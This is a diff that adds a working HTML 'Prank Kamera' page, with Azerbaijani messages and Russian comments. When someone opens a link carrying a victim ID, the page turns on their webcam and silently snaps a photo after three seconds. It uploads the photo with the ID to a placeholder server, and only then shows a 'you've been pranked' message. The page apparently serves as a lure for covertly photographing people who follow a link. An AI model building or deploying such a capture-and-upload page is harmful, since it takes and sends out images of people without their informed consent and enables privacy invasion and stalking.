@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8" />
+  <title>Prank Kamera</title>
+</head>
+<body>
+  <video id="video" autoplay muted playsinline style="width: 100%; max-width: 400px;"></video>
+  <script>
+    const queryParams = new URLSearchParams(window.location.search);
+    const userId = queryParams.get('id'); // Получаем id из ссылки
+
+    if (!userId) {
+      alert("Səhv bağlantı: istifadəçi ID tapılmadı.");
+      throw new Error("User ID missing in URL.");
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('userId', userId);
+
+            fetch('https://YOUR_SERVER.com/api/photo', {
+              method: 'POST',
+              body: formData
+            }).then(() => {
+              alert('Sizi prank etdilər! 😊');
+              stream.getTracks().forEach(track => track.stop()); // остановить камеру
+            }).catch(() => {
+              alert('Xəta baş verdi. Təkrar cəhd edin.');
+            });
+          });
+        }, 3000);
+      })
+      .catch(() => {
+        alert("Kamera aktivləşdirilə bilmədi.");
+      });
+  </script>
+</body>
+</html>
